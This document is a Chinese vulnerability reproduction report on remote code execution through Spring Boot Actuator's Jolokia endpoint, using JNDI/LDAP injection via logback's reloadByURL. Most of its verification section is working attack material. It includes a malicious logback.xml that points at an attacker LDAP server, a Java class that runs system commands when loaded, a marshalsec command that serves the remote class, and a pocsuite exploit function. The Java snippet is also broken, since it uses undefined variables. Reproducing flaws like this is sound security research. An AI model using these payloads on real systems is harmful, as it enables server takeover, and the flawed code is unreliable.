## spring boot actuator jolokia 漏洞复现报告
更多内容参见：https://flowerlake.github.io/2019/12/03/Spring-Boot-Actuator-Jolokia/

### 0x01 漏洞测试环境

一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。

不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。

.......

### 0x09 漏洞验证流程

1. 搭建一个简单的HTTP服务器，可用于下载logback.xml

2. “reloadByURL”函数从 http://127.0.0.1/logback.xml 下载新的配置并将其解析为Logback。 此恶意配置应具有以下内容：
```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3. 在易受攻击的服务器上解析此文件时，它会创建与“env-entry-name”参数值中指定的攻击者LDAP服务器的连接，从而导致JNDI进行解析。 恶意的LDAP服务器可以返回具有“引用”类型的对象，以触发在目标应用程序上执行字节码。 
4. 创建恶意类，比如实现打开计算器的操作，在构造函数 Exploit() 中写入执行代码，在恶意类加载的时候即可执行恶意代码。然后在8081端口下开启一个HTTP服务，或者使用刚才的8080端口的HTTP服务也可以。
```java
public static String exec(String command) throws Exception{
        String returnValue = "";
        BufferedInputStream inputStream = new BufferedInputStream(Runtime.getRuntime().exec(command).getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String lineStr = "";
        while((lineStr = bufferedReader.readLine())!=null){
            sb += lineStr + "\n";
        }
        inputStream.close();
        bufferedReader.close();
        return returnValue;   
    }
    public Exploit() throws Exception{
        String result = "";
        result = exec("open /System/Applications/Calculator.app");
        throw new Exception(exec(cmd));
    }
```

5. 开启JNDI，使用marshalsec可以很方便的开启JNDI服务
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/#Exploit 1389
```

6. 编写poc suite，该POC较为简单，只需要在_attack下添加一个HTTP请求即可
```
def _attack(self):
        result = {}

        payload = "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8080!/logback.xml"
        vul_url = self.url + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        r = requests.get(vul_url, headers=headers)
        if r.status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['Content'] = r.text
        return self.parse_output(result)
```
最终的测试结果如下：

![Screen Shot 2019-12-10 at 22.18.04](/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 22.18.04.png)

